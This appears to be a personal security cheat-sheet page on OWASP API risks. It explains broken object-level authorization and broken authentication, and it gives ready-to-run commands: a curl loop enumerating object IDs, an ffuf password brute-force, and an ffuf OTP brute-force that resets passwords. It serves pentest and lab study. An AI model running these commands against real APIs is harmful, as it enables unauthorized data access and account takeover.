---
layout: default
title: API attacks
permalink: /Web/API/
---

# OWASP API Top 10 Security Risks using a RESTful web API

## Broken Object Level Authorization (BOLA)
Web APIs allow users to request data or records by sending various parameters, including unique identifiers such as Universally Unique Identifiers (UUIDs), also known as Globally Unique Identifiers (GUIDs), and integer IDs. Failing to properly verify that a user has permission to view a specific resource through object-level authorization mechanisms can lead to security vulnerabilities.
BOLA also known as an Insecure Direct Object Reference (IDOR) vulnerability.

Mass abuse BOLA from terminal:
```
for ((i=1; i<=20; i++));
do curl -s -w "\n" -X 'GET' \
'http://$ip:$port/endpoint/'$i'' \
-H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbG<SNIP>' | jq;
done
```

## Broken Authentication
No rate-limiting on the endpoint, so brute-forcing is possible.
```
ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://$ip:$port/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```
### Brute-forcing OTPs and Answers of Security Questions
If brute-forcing passwords is infeasible due to strong password policies, we can attempt to brute-force OTPs or answers to security questions to reset passwords.
Send a password reset and then fuzz the OTP:
```
ffuf -u http://$ip:$port/api/v1/authentication/customers/passwords/resets \
-X POST \
-H "accept: application/json" \
-H "Content-Type: application/json" \
-d '{"Email":"$email","OTP":"FUZZ","NewPassword":"123456"}' \
-w /opt/useful/seclists/Fuzzing/4-digits-0000-9999.txt
```
